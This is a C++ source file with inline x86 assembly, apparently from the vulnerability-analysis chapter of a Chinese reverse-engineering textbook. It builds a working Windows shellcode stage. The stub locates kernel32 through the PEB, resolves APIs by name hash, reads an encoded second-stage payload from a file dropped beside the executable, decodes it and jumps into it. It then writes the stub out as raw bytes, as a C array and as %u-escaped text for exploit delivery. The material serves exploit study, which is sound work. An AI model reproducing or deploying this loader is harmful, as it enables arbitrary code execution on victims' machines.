/*-----------------------------------------------------------------------
第14章  漏洞分析技术
《加密与解密（第四版）》
(c)  看雪学院 www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

// make_sc.cpp : Defines the entry point for the console application.
//


#include <windows.h>
#include "stdio.h"

#define FILE_TAR	0x00


int main(int argc, char* argv[])
{
	DWORD scStart,scEnd,decodescEnd,decodesc2End;
	goto make_F;

	_asm{	
		
sc_start:
	
main_start:
			
		push ebp
		xor ecx,ecx
		mov esi,fs:0x30
		mov esi, [esi + 0x0C];
		mov esi, [esi + 0x1C]; 
		mov ebx, [esi + 0x08]
next_module:
		mov ebp, [esi + 0x08];
		
		mov edi, [esi + 0x20];
		mov esi, [esi];
		cmp [edi + 12*2],cx   
		jne next_module
		mov ebx,ebp;BaseAddr of Kernel32.dll		

		jmp     sc_001213B0
sc_00121084:
		pop     ebp			//捆绑数据地址
		mov     edi, ebp
		push    0Ah			//0A个API函数HASH值
		pop     ecx

sc_0012108D:		
		call    sc_00121369 //循环查找API地址
		loop	sc_0012108D
		
		
		//VirtualAlloc Path 
		push    40h
		push    1000h
		push    200h			//申请空间大小
		push    0
		call    dword ptr [ebp+1Ch]	//	kernel32.VirtualAlloc给第二段shellcode申请空间
		mov     dword ptr [ebp+180h], eax

		//GetMoudleFileNameW
		push    200h
		push    eax
		push	0
		call    dword ptr [ebp];GetMoudleFileNameW
		test    eax, eax
		je      error
		//Set shellcode File Path
		add		eax, eax
		mov     ecx, eax
		mov     eax, dword ptr [ebp+180h]
		add     eax, ecx
goon_Find:
		mov     byte ptr[eax], 00h
		dec     eax
		cmp     byte ptr[eax], 5ch
		jne     goon_Find

		lea		eax, dword ptr [ebp+28h]//DllName
		push	eax
		push    dword ptr [ebp+180h]//ExePath
		call    dword ptr [ebp+4]//lstrcatW
		
		push	0
		push	80h;FILE_ATTRIBUTE_NORMAL
		push	OPEN_EXISTING
		push	0;
		push	3
		push	GENERIC_READ
		push	dword ptr [ebp+180h]
		call	dword ptr [ebp+8]//CreateFileW
		mov		dword ptr [ebp+184h], eax

		push    0
		push    0
		push	FILE_TAR ;特殊标记位置
		push    eax
		call    dword ptr [ebp+0Ch]	//SetFilePointer
		
		push	0
		push	dword ptr [ebp+184h]
		call	dword ptr [ebp+10h]//GetFileSize
		mov		dword ptr [ebp+188h], eax

		push    40h
		push    1000h
		push    eax			//申请空间大小
		push    0
		call    dword ptr [ebp+1Ch]//VirtualAlloc Shellcode
		mov		dword ptr [ebp+18ch], eax
		
		push    0
		lea     eax, dword ptr [ebp+190h]
		push    eax
		push	dword ptr [ebp+188h]
		push    dword ptr [ebp+18ch] //将标记存放至此
		push    dword ptr [ebp+184h]
		call    dword ptr [ebp+14h] //Kernel32.ReadFile
		
		push	dword ptr [ebp+184h]
		call	dword ptr [ebp+18h]	//CloseHandle
		
		push    08000h
		push    00h
		push    dword ptr [ebp+180h]
		call    dword ptr [ebp+020h]              ; kernel32.VirtualFree


		//Decode ShellCode
		mov		ebx,dword ptr [ebp+18ch]
		xor		ecx, ecx
		
decode_sc2:		
		add     byte ptr[ebx+ecx], 033h
		xor		byte ptr[ebx+ecx], 099h
		sub     byte ptr[ebx+ecx], 0fah
		inc		ecx
		cmp		ecx, dword ptr [ebp+188h]
		jnz		decode_sc2

		//JMP Shellcode
		jmp    dword ptr [ebp+188h];

error:	
		retn;

sc_00121369:		
		push    ecx
		push    ebp
		mov     esi, dword ptr [ebx+3Ch]
		mov     esi, dword ptr [esi+ebx+78h]
		add     esi, ebx
		push    esi
		mov     esi, dword ptr [esi+20h]
		add     esi, ebx
		xor     ecx, ecx
		dec     ecx
			
sc_0012137D:		
		inc     ecx
		lods    dword ptr [esi]
		add     eax, ebx
		xor     ebp, ebp
			
sc_00121383:
		movsx   edx, byte ptr [eax]
		cmp     dl, dh
		je      sc_00121392
		ror     ebp, 7
		add     ebp, edx
		inc     eax
		jmp     sc_00121383
			
sc_00121392:		
		cmp     ebp, dword ptr [edi]
		
		jnz     sc_0012137D
		pop     esi
		mov     ebp, dword ptr [esi+24h]
		add     ebp, ebx
		mov     cx, word ptr [ebp+ecx*2]
		mov     ebp, dword ptr [esi+1Ch]
		add     ebp, ebx
		mov     eax, dword ptr [ebp+ecx*4]
		add     eax, ebx
		stos    dword ptr es:[edi]
		pop     ebp
		pop     ecx
		retn

		nop 
		nop 
		nop 
		nop 
	sc_001213B0:	call    sc_00121084

sc_end:
	}
make_F:
	_asm{

		mov scStart,offset sc_start
		mov	decodescEnd, offset main_start
		mov	scEnd,offset sc_end
	}
	DWORD scLen = scEnd - scStart;
	DWORD decodeLen = decodescEnd - scStart;
	DWORD codeLen = scEnd - decodescEnd;
	char fileName[] = 
		"\x03\xb0\xff\xb4"		//ebp,GetModuleFileNameW//获取文件路径
		"\x86\x1f\x7D\x86"		//ebp+4,lstrcatW
		"\xa9\x32\xE4\x94"		//ebp+8,CreateFileW
		"\x43\xBE\xAC\xDB"		//ebp+0Ch,SetFilePointer
		"\x8E\x13\x0A\xAC"		//ebp+10h,GetFileSize
		"\xB2\x36\x0F\x13"		//ebp+14h,ReadFile
		"\x57\x66\x0D\xFF"		//ebp+18h,CloseHandle		
		"\x67\x59\xDE\x1E"		//ebp+1ch,VirtualAlloc
		"\x05\xaa\x44\x61"		//ebp+20h,VirtualFree
		"\xA0\x65\x97\xCB"		//ebp+24h,Sleep
		"\x6D\x00\x63\x00\x6F\x00\x65\x00\x6D\x00\x63\x00\x70\x00\x79\x00\x2E\x00\x64\x00\x61\x00\x74\x00"//ebp+28h,设置释放的poc文件名
		"\x00";
	char stopFlag[] = "\x66\x00";
	int i=0;
	byte *newscBuff = new byte[decodeLen+codeLen+sizeof(fileName)+sizeof(stopFlag) ];
	char low_al,hi_ah;
	memset(newscBuff,0x00,decodeLen+codeLen+sizeof(fileName)+sizeof(stopFlag));
	memcpy(newscBuff,(byte *)scStart,decodeLen);
	byte xxx;
	for (i = 0;i < codeLen; i++)
	{
		xxx = ((byte *)decodescEnd)[i];
		xxx = xxx + 0x00;
		xxx = xxx ^ 0x00;
		xxx = xxx - 0x00;
		newscBuff[decodeLen+i] = xxx;
	}
	
	for (i = 0;i < sizeof(fileName); i++)
	{
		xxx = fileName[i];
		xxx = xxx + 0x00;
		xxx = xxx ^ 0x00;
		xxx = xxx - 0x00;
		newscBuff[decodeLen+codeLen+i ] = xxx;
		//newscBuff[decodeLen+codeLen+i ] = fileName[i] ^ 0xce;
	}
	memcpy((byte *)(newscBuff+decodeLen+codeLen+sizeof(fileName)),stopFlag,sizeof(stopFlag));
	int newscBuff_length = decodeLen+codeLen+sizeof(fileName)+sizeof(stopFlag) ;
	FILE *fp = fopen("./sc.bin","wb+");
	fwrite(newscBuff,newscBuff_length,1,fp);
	fclose(fp);
   
	FILE *fp_cpp = fopen("./shellcode_cpp.cpp","wb+");
	fwrite("unsigned char sc[] = {",22,1,fp_cpp);
	for (i=0;i<newscBuff_length;i++)
	{
		if (i%16==0)
		{
			fwrite("\r\n",2,1,fp_cpp);
		}
		fprintf(fp_cpp,"0x%02x,",newscBuff[i]);
	}
	fwrite("};",2,1,fp_cpp);
	fclose(fp_cpp);
	
	FILE *fp_unicode = fopen("./GetCommandLineA_SC_part2_unicode.txt","wb+");
	for(i = 0; i < newscBuff_length; i += 2)
	{
		fprintf(fp_unicode,"%%u%02x%02x",newscBuff[i+1],newscBuff[i]);
	}
	
	fprintf(fp_unicode,stopFlag);
	fclose(fp_unicode);
	return 0;
}
